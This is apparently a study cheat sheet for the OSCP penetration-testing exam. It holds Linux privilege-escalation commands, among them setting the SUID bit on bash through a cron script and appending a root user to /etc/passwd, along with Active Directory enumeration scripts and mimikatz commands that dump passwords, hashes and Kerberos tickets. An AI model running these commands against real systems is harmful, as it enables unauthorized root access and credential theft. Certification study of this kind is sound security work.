# OSCP Tricks

## Privilege Escalation

### Crontab
#### Enumeration  
```
cat /var/log/cron.log                                                                                                                                              
cat /etc/crontab
```
#### Exploitation  
```
echo "chmod +s /bin/bash" >> script.sh
```

### Services
#### Enumeration  
```
ps aux
```

### SUID
#### Enumeration  
```
find / -perm -u=s -type f 2>/dev/null
```
#### Exploitation
https://gtfobins.github.io/

### Capabiliti3es
#### Enumeration  
```
getcap -r / 2>/dev/null
```
#### Exploitation  
https://gtfobins.github.io/

### Passwd Writabble
#### Enumeration  
```
ls -la /etc/passwd
```
#### Exploitation  
```
echo "okays:$(openssl passwd okay2):0:0:root:/root:/usr/bin/bash" >> /etc/passwd
```

### Enumeration Automated

#### Unix Privesc Check
```
./unix-privesc-check
```
https://pentestmonkey.net/tools/audit/unix-privesc-check

#### Linpeas
```
./linpeas.sh
```
https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS


## Active Directory
## Enumeration

-> Enumerates all local accounts
```
net user
```

-> Enumerate all users in the entire domain
```
net user /domain
```

-> Get information from a specific user
```
net user <user> /domain
```

-> Enumerate all groups in the entire domain
```
net group /domain
```

-> Find out domain controller hostname
```
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
```

-> Enumeration script for all AD users, along with all properties for those user accounts.
```
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

$PDC = ($domainObj.PdcRoleOwner).Name

$SearchString = "LDAP://"

$SearchString += $PDC + "/"

$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"

$SearchString += $DistinguishedName

$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)

$objDomain = New-Object System.DirectoryServices.DirectoryEntry

$Searcher.SearchRoot = $objDomain

$Searcher.filter="samAccountType=805306368"

$Result = $Searcher.FindAll()

Foreach($obj in $Result)
{
    Foreach($prop in $obj.Properties)
    {
        $prop
    }
    
    Write-Host "------------------------"
}
```

-> Enumerate logged users
```
Import-Module .\PowerView.ps1
Get-NetLoggedon -ComputerName <computer_name>
```

-> Enumerate all active sessions
```
Get-NetSession -ComputerName dc1
```

-> PowerShell enumeration script to filter the serviceprincipalname property to the string *http*
```
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

$PDC = ($domainObj.PdcRoleOwner).Name

$SearchString = "LDAP://"
$SearchString += $PDC + "/"

$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"

$SearchString += $DistinguishedName

$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)

$objDomain = New-Object System.DirectoryServices.DirectoryEntry

$Searcher.SearchRoot = $objDomain

$Searcher.filter="serviceprincipalname=*http*"

$Result = $Searcher.FindAll()

Foreach($obj in $Result)
{
    Foreach($prop in $obj.Properties)
    {
        $prop
    }
}
```







### Cached Credential Storage and Retrieval
-> Dump the credentials of all connected users, including cached hashes
```
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

-> show Offsec user tickets that are stored in memory
```
mimikatz.exe "sekurlsa::tickets"
```
